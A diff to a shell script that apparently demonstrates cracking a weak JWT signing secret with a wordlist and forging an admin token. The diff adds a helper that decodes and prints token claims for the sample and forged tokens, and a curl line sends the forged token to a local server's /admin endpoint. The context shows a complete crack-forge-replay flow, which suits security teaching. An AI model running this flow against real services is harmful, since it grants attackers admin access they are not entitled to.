@@ -64,9 +64,30 @@ print(t.decode('utf-8') if isinstance(t, bytes) else t)
 
 WORDLIST_SIZE=$(wc -l < "$WORDLIST" | tr -d ' ')
 
+# Pretty-print a JWT's header and payload claims to stdout.
+# Args: $1 = token, $2 = label for the indent prefix
+print_claims() {
+    "$VENV_PYTHON" - "$1" <<'PY'
+import sys, json, base64
+
+def b64url_decode(s):
+    s += '=' * (-len(s) % 4)
+    return base64.urlsafe_b64decode(s.encode())
+
+token = sys.argv[1]
+header_b64, payload_b64, _sig = token.split('.')
+header = json.loads(b64url_decode(header_b64))
+payload = json.loads(b64url_decode(payload_b64))
+print('    header:  ' + json.dumps(header))
+print('    payload: ' + json.dumps(payload))
+PY
+}
+
 echo "=== $DEMO weak-secret crack ==="
 echo "Sample token (would be captured from a target in practice):"
 echo "  $SAMPLE_TOKEN"
+echo "  decoded claims:"
+print_claims "$SAMPLE_TOKEN"
 echo
 echo "Cracking against $WORDLIST_SIZE candidate secrets in $WORDLIST..."
 echo
@@ -93,6 +114,8 @@ echo
 FORGED=$("$VENV_PYTHON" "$SCRIPT_DIR/forge.py" "$CRACKED" --id 99 --role admin)
 echo "Forged admin token:"
 echo "  $FORGED"
+echo "  decoded claims (note id and role changed from the sample):"
+print_claims "$FORGED"
 echo
 echo "Send to the running server to confirm acceptance:"
 echo "  curl -H \"$HEADER: $FORGED\" http://localhost:$PORT/admin"
